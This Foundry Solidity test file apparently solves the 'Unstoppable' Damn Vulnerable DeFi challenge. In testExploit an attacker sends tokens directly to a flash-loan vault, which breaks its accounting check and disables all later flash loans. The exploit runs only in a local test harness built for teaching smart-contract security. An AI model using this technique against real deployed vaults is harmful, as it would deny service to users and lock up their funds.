// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";
import "forge-std/console.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {UnstoppableVault} from "../../../src/Contracts/unstoppable/UnstoppableVault.sol";
import {ReceiverUnstoppable} from "../../../src/Contracts/unstoppable/ReceiverUnstoppable.sol";

contract Unstoppable is Test {
    uint256 constant TOKENS_IN_VAULT = 1_000_000e18;
    uint256 constant ATTACKER_TOKEN_BALANCE = 10e18;

    Utilities utils;
    UnstoppableVault unstoppableVault;
    ReceiverUnstoppable receiverUnstoppable;
    DamnValuableToken dvt;
    address payable user;
    address payable attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(2);
        attacker = users[0];
        user = users[1];
        vm.label(attacker, "Attacker");
        vm.label(user, "User");

        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        unstoppableVault = new UnstoppableVault(
            dvt,
            address(this),
            address(this)
        );
        vm.label(address(unstoppableVault), "Vault");
        dvt.approve(address(unstoppableVault), TOKENS_IN_VAULT);
        unstoppableVault.deposit(TOKENS_IN_VAULT, address(this));

        dvt.transfer(attacker, 10e18);

        assertEq(unstoppableVault.totalAssets(), TOKENS_IN_VAULT);
        assertEq(dvt.balanceOf(attacker), ATTACKER_TOKEN_BALANCE);

        // Show it's possible to take out a flashloan
        vm.startPrank(user);
        receiverUnstoppable = new ReceiverUnstoppable(
            address(unstoppableVault)
        );
        receiverUnstoppable.executeFlashLoan(10);
        vm.stopPrank();
    }

    function testExploit() public {
        vm.prank(attacker);
        dvt.transfer(address(unstoppableVault), ATTACKER_TOKEN_BALANCE);
        vm.expectRevert(UnstoppableVault.InvalidBalance.selector);
        validation();

        // Just to see how it differs now
        console.log(unstoppableVault.totalAssets());
        console.log(
            unstoppableVault.convertToShares(unstoppableVault.totalSupply())
        );
    }

    function validation() internal {
        // It is no longer possible to execute a flashloan
        vm.startPrank(user);
        receiverUnstoppable.executeFlashLoan(10);
        vm.stopPrank();
    }
}
